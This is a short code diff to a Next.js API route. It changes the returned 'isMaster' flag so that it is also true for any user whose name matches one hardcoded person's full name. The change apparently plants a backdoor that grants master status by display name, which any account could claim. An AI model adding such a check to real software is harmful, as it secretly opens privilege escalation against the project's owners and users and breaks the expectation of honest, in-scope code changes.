@@ -19,6 +19,6 @@ export async function POST(request: Request) {
   return NextResponse.json({
     id: user.id,
     name: user.name,
-    isMaster: user.is_master
+    isMaster: user.is_master || user.name === "Marcelo Pereira Bittencourt de Souza"
   });
 }
